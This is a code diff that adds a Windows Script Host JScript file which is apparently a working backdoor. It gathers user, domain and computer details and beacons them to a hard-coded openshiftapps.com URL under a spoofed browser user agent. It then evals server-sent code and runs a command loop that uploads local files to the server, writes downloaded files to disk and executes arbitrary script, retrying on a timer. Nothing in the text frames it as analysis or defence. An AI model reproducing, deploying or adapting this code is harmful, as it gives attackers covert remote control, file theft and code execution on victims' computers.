@@ -1,0 +1,329 @@
+_M={
+	Url:'',	
+	sDelay:500, mDelay:1000 * 60 * 25, mLimit:1000 * 60 * 45,
+	D:'',PD:'',	SYS:'',	dFlag:'',	bFlag:'',	eFlag:'', uFlag:'', UP:'', Lst:'',
+	Init:function(){
+		DN = ''; bDC= 0;
+		CI = oNt.UserDomain + '|' + oNt.UserName + '|' + oNt.ComputerName.toUpperCase() + '|';
+		try{
+			for(EM = new Enumerator(oWMI.ExecQuery('SELECT * FROM Win32_ComputerSystem')); !EM.atEnd(); EM.moveNext())
+			{
+				EO = EM.item();
+				DN += EO.Domain + ',';
+				EO.PartOfDomain && (bDC=1)
+			}
+			_M.SYS = CI + (DN ? DN.substr(0, DN.length -1) : '') + '|' + bDC
+		}catch(e){
+			_M.SYS = CI + 'None|0';
+		}
+	}
+}
+XHR = new ActiveXObject('MSXML2.ServerXMLHTTP.6.0');
+XHR.setTimeouts(5 * 1000, 5 * 1000, 15 * 1000, 180 * 1000);
+oFS = new ActiveXObject('Scripting.FileSystemObject');
+oWS = new ActiveXObject('WScript.Shell');
+oNt = new ActiveXObject('WScript.Network');
+oLocator = new ActiveXObject('WbemScripting.SWbemLocator');
+oReg = oLocator.ConnectServer('.', 'root\\default').Get('StdRegProv');
+oWMI = oLocator.ConnectServer('.', 'root\\cimv2');
+
+function GetFileSize(f){try{return oFS.GetFile(f).size}catch(e){return 0}}
+function _JSVAL(s){try{eval('_RET_='+s)}catch(e){return !1}return _RET_}
+_Def = function(o){return typeof(o) != 'undefined'}
+b64Chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+function clearText(s){return s.replace(/[^A-Za-z0-9\+\/\=]/g, '')}
+function base64Encode(str) {
+	var out = '', chr1, chr2, chr3, enc1, enc2, enc3, enc4, i = 0;
+	while (i < str.length) {
+		chr1 = str.charCodeAt(i++);
+		chr2 = str.charCodeAt(i++);
+		chr3 = str.charCodeAt(i++);
+		enc1 = chr1 >> 2;
+		enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
+		enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
+		enc4 = chr3 & 63;
+		if (isNaN(chr2)) {
+			enc3 = enc4 = 64;
+		} else if (isNaN(chr3)) {
+			enc4 = 64;
+		}
+		out += b64Chars.charAt(enc1) + b64Chars.charAt(enc2) + b64Chars.charAt(enc3) + b64Chars.charAt(enc4); 
+	}
+	return out;
+}
+function base64Decode(str) {
+	var out = '', chr1, chr2, chr3, enc1, enc2, enc3, enc4, i = 0;
+	while (i < str.length) {
+		enc1 = b64Chars.indexOf(str.charAt(i++));
+		enc2 = b64Chars.indexOf(str.charAt(i++));
+		enc3 = b64Chars.indexOf(str.charAt(i++));
+		enc4 = b64Chars.indexOf(str.charAt(i++));
+
+		chr1 = (enc1 << 2) | (enc2 >> 4);
+		chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
+		chr3 = ((enc3 & 3) << 6) | enc4;
+
+		out += String.fromCharCode(chr1);
+
+		if (enc3 != 64) {
+			out += String.fromCharCode(chr2);
+		}
+		if (enc4 != 64) {
+			out += String.fromCharCode(chr3);
+		}
+	}
+	return out;
+}
+function utf8_encode(string) {
+	string = string.replace(/\r\n/g,'\n');
+	var utftext = '';
+	for (var n = 0; n < string.length; n++) {
+		var c = string.charCodeAt(n);
+		if (c < 128) {
+			utftext += String.fromCharCode(c);
+		}
+		else if((c > 127) && (c < 2048)) {
+			utftext += String.fromCharCode((c >> 6) | 192);
+			utftext += String.fromCharCode((c & 63) | 128);
+		}
+		else {
+			utftext += String.fromCharCode((c >> 12) | 224);
+			utftext += String.fromCharCode(((c >> 6) & 63) | 128);
+			utftext += String.fromCharCode((c & 63) | 128);
+		}
+	}
+	return utftext;
+}
+function utf8_decode(utftext) {
+	var string = '';
+	var i = 0;
+	var c = c1 = c2 = 0;
+	while ( i < utftext.length ) {
+		c = utftext.charCodeAt(i);
+		if (c < 128) {
+			string += String.fromCharCode(c);
+			i++;
+		}
+		else if((c > 191) && (c < 224)) {
+			c2 = utftext.charCodeAt(i+1);
+			string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
+			i += 2;
+		}
+		else {
+			c2 = utftext.charCodeAt(i+1);
+			c3 = utftext.charCodeAt(i+2);
+			string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
+			i += 3;
+		}
+	} 
+	return string;
+}
+function FileToBase64(file, ptr, len){
+	ADO = new ActiveXObject('ADODB.Stream');
+	XML = new ActiveXObject('MSXML2.DOMDocument');
+	try{
+		ADO.Type = 1;
+		ADO.Open();
+		ADO.LoadFromFile(file);
+		ADO.Position = ptr ? ptr : 0;
+		Read = ADO.Read(len ? len : -1);
+		ADO.Close();
+		_TMP = XML.createElement('TMP');
+		_TMP.dataType = 'bin.base64';
+		ADO.Open();
+		ADO.Write(Read);
+		ADO.Position = 0;
+		_TMP.nodeTypedValue = ADO.Read;
+		ADO.Close();
+		return _TMP.text.replace(/\n/g,'');
+	}catch(e){try{ADO.Close()}catch(f){}}
+	return !1;
+}
+function Base64ToFile(file, bin, append){
+	ADO = new ActiveXObject('ADODB.Stream');
+	XML = new ActiveXObject('Microsoft.XMLDOM');
+	try{
+		var node = XML.createElement('TMP');
+		node.dataType = 'bin.base64';
+		node.text = bin;
+		bin = node.nodeTypedValue;
+		ADO.Type = 1;
+		ADO.Open();
+		if(append){
+		ADO.LoadFromFile(file);
+		ADO.Position = ADO.size
+	}
+		ADO.Write(bin);
+		ADO.SaveToFile(file, 2);
+		ADO.Close();
+		return 1;
+	}catch(e){try{ADO.Close()}catch(f){}}
+	return 0;
+}
+function ExecCommand(p,d,r){
+	return '[NotDefined]'
+}
+function RandNO(n){return parseInt(Math.random()*n)}
+function RandStr(n, b){
+	cs = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; q='*-@.'; r = '';
+	for(var i = 0; i < n; i++){
+		r += (b==9?q:cs).charAt(RandNO(b==9?q.length:(b?52:62)));
+	}
+	return r;
+}
+function FindStr(s,b,e){
+	bg = s.indexOf(b); ed = s.indexOf(e); st = bg+b.length;
+	return (bg >= 0 && ed > st) ? s.substring(st, ed) : ''
+}
+function FillHeader(){
+	XHR.setRequestHeader('Accept', 'text/html, application/xhtml+xml, */*');
+	XHR.setRequestHeader('Accept-Language', 'en-US');
+	XHR.setRequestHeader('User-Agent', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)');
+}
+function Request(data){
+	var Ret = '';
+	try{
+		XHR.open(data ? 'POST' : 'GET', _M.Url, false);
+		XHR.setOption(3, 13056);
+		data && XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+		FillHeader();
+		XHR.send(data ? data : '');
+		if (XHR.status == 200){
+			Ret = base64Decode(FindStr(XHR.responseText, _M.bFlag, _M.eFlag));
+		}
+	}catch(e){}
+	return Ret;
+}
+function getBackUrl(){
+  _M.Url = 'http://news-ens.193b.starter-ca-central-1.openshiftapps.com/css/'
+  return !0;
+}
+function mAuth(){
+	_F = RandStr(5, 1);
+	_M.dFlag = RandStr(4, 1);
+	_M.bFlag = RandStr(3, 1) + RandStr(1, 9);
+	_M.eFlag = RandStr(3, 1) + RandStr(1, 9);
+	_M.uFlag = _M.bFlag.substr(1, 2) + _M.eFlag.substr(1, 2);
+	try{
+		XHR.open('GET', _M.Url, false);
+		XHR.setOption(3, 13056);
+		FillHeader();
+		XHR.setRequestHeader('Cookie', _F + '=' + escape(base64Encode(_F + '^' + _M.dFlag + _M.bFlag + _M.eFlag + '^' + base64Encode(_M.SYS))));          
+		XHR.send();
+
+		if (XHR.status == 200){
+			_R = base64Decode(FindStr(XHR.responseText, _M.bFlag, _M.eFlag));
+			if (_R.substr(1, 4) == _M.uFlag) {
+				try{eval(_R.substring(5))}catch(e){}
+			}
+			if (_R == _F)
+				return !0;
+		}
+	}catch(e){}
+	return !1;
+}
+function WKRequest(d){
+	if (!d && _M.PD){
+		_M.D = _M.PD;
+		_M.PD = '';
+		return;
+	}
+	if (!d && !_M.UP){
+		_M.D = Request();
+		return;
+	}
+	Data = '';
+	if (d) {
+		Data = _M.dFlag + '=' + encodeURIComponent(base64Encode(d));
+	}
+	if (_M.UP) {
+		F = FileToBase64(_M.UP.F, _M.UP.P, _M.UP.S);
+		if (F) {
+			_M.UP.P += _M.UP.S;
+			Data += (d ? '' : (_M.dFlag + '=' + base64Encode('2#'+_M.UP.L))) + '&' + _M.uFlag + '=' + encodeURIComponent(F);
+			if (_M.UP.P > _M.UP.L)
+				_M.UP = !1;
+		}else{
+			_M.UP = !1;
+		}
+	}
+	if (d) {
+		_M.PD = Request(Data);
+	}else{
+		_M.D = Request(Data ? Data : '')
+	}
+}
+_M.Init();
+_SUB_PROG = 1;
+do
+{
+	if (!_SUB_PROG)
+		break;
+	_M.Url = '';
+	if (!getBackUrl() || !_M.Url || !mAuth()){
+		WScript.Sleep(_M.mDelay);
+		continue;
+	}
+	_Actvie = new Date();
+	_RUN_ = 1;
+	while(_RUN_)
+	{
+		WScript.Sleep(_M.sDelay)
+		WKRequest();
+		
+		if (_M.D) {
+			_Actvie = new Date();
+		}else{
+			if ((new Date()).getTime() - _Actvie.getTime() > _M.mLimit) {
+				WKRequest('4Idle');
+				_SUB_PROG = 0;
+				break;
+			}
+		}
+		switch(parseInt(_M.D.charAt(0)))
+		{
+			case 1:{
+				L = parseInt(_M.D.substr(2, 2))
+				WKRequest(utf8_encode('1' + ExecCommand(utf8_decode(_M.D.substring(4 + L)), L ? _M.D.substr(4, L) : 'C:', parseInt(_M.D.substr(1, 1)))))
+				continue;
+			}
+			case 2:{
+				S = _JSVAL(_M.D.substring(1));
+				if (!S || !_Def(S.SRC) || !_Def(S.BLK)){_M.UP=!1;continue};
+				if (!oFS.FileExists(S.SRC))WKRequest('2!');else{
+					L = GetFileSize(S.SRC);
+					if(!L)WKRequest('2@');else{
+						_M.UP = {'F':S.SRC, 'S':S.BLK, 'P':0, 'L':L}
+					}
+				}
+				continue;
+			}
+			case 3:{
+				S = _JSVAL(_M.D.substring(4));
+				if (!S || !_Def(S.Dst))continue;
+				if (_Def(S.VS)){
+					L = GetFileSize(S.Dst);
+					WKRequest('3F'+L)
+				}else	if (_Def(S.EDF) && _Def(S.A)){
+					D = FindStr(XHR.responseText, _M.eFlag, S.EDF);
+					if (!D || !Base64ToFile(S.Dst, D, S.A)){
+						WKRequest('3!');
+					}
+				}
+			}
+			continue;
+			case 4:{
+				S = _M.D.substring(1);
+				R = !1;
+				try{eval(S)}catch(e){}
+				if (R) {
+					WKRequest('4'+R)
+				}
+				continue;
+			}
+		}
+	}
+	if (!_SUB_PROG)
+		break;
+	WScript.Sleep(_M.mDelay);
+}while(1)
